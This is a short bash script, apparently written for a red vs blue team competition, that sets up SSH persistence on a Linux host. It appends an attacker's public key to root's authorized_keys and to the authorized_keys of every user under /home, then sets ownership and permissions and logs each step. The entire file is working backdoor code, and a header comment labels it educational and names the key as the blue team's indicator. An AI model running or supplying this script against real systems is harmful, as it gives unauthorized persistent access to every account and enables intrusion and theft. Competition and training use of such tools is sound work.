#!/bin/bash
# red_team_ssh_persist.sh
# EDUCATIONAL - Red vs Blue Competition Use Only
# Blue team indicator: unauthorized key in authorized_keys files

ATTACKER_KEY="ssh-rsa <put here> redteam@competition"

# Add to root
mkdir -p /root/.ssh
echo "$ATTACKER_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo "[RED TEAM] Key added to root" >> /tmp/redteam_actions.log

# Add to all users with home directories
for user_home in /home/*/; do
    username=$(basename "$user_home")
    mkdir -p "$user_home/.ssh"
    echo "$ATTACKER_KEY" >> "$user_home/.ssh/authorized_keys"
    chown -R "$username:$username" "$user_home/.ssh"
    chmod 700 "$user_home/.ssh"
    chmod 600 "$user_home/.ssh/authorized_keys"
    echo "[RED TEAM] Key added to $username" >> /tmp/redteam_actions.log
done

echo "[RED TEAM] SSH persistence complete"